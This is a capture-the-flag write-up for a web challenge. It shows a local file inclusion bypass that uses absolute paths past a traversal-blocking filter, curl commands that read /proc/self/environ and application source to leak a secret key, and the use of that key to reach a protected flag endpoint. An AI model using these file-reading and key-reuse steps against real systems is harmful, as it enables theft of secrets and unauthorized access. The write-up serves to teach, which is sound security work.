# 🕵️ Penetrable Tanish Writeup

<p align="center">
  <img src="https://img.shields.io/badge/CATEGORY-WEB%20%2F%20LFI-purple?style=for-the-badge">
  <img src="https://img.shields.io/badge/DIFFICULTY-MEDIUM-black?style=for-the-badge">
  <img src="https://img.shields.io/badge/TECHNIQUE-PROCFS%20ABUSE-blue?style=for-the-badge">
  <img src="https://img.shields.io/badge/FOCUS-RUNTIME%20SECRET%20LEAK-green?style=for-the-badge">
</p>

---

## 📜 Challenge Description

Our "impenetrable" secure document viewer is finally live.  
We’ve implemented a Web Application Firewall to stop ../ attacks.  
Sensitive authentication keys are stored in runtime memory.  

Flag format: geek{...}

---

## 🔍 Initial Analysis

Endpoint observed:

/api/read?file=public/readme.txt  

Observations:

- File reading functionality exposed  
- ../ traversal blocked  
- Secrets stored in runtime  
- Admin authentication required  

➡️ Indicates **Local File Inclusion (LFI)** vulnerability  

---

## 🚧 Step 1: WAF Behavior

Blocked:

- ../  
- ..%2f  
- keyword: batman  

Allowed:

- Absolute paths (/etc/passwd, /proc/...)  

➡️ WAF only filters traversal, not absolute paths  

---

## 💥 Step 2: ProcFS Exploitation

Command:

curl -s 'https://ctf-lfi-ctf-lfi.vinm.me/api/read?file=/proc/self/environ' | tr '\0' '\n'

Output:

CTF_CORE_SECRET_KEY=production_secret_key_99  

➡️ Runtime environment variables leaked  

---

## 🔍 Step 3: Source Code Extraction

Command:

curl -s 'https://ctf-lfi-ctf-lfi.vinm.me/api/read?file=/app/main.go'

Key findings:

- Admin key loaded from environment  
- Flag endpoint exists  
- Header-based authentication used  

Logic:

AdminApiKey = CTF_CORE_SECRET_KEY  
Header required = X-API-Key  

---

## 🔓 Step 4: Authentication Bypass

Using leaked key:

curl -s 'https://ctf-lfi-ctf-lfi.vinm.me/api/flag' -H 'X-API-Key: production_secret_key_99'

➡️ Access granted  

---

## 🎯 Result

geek{i_am_6atman}

---

## 🏁 Final Flag

geek{i_am_6atman}

---

## 🧠 Key Takeaways

- Blocking ../ is not sufficient for LFI protection  
- Absolute path access can bypass weak WAFs  
- /proc/self/environ exposes runtime secrets  
- LFI + source code disclosure = full compromise  
- Environment variables must be protected  

---

## 🛠 Tools Used

- curl  
- Linux ProcFS  
- Manual analysis  

---

## 🏁 Conclusion

This challenge demonstrates how improper LFI protections combined with exposed runtime secrets can lead to full application compromise. By leveraging ProcFS and analyzing source code, authentication was bypassed and the flag retrieved.

---

<p align="center">
  ⭐ If you found this helpful, consider starring the repo!
</p>
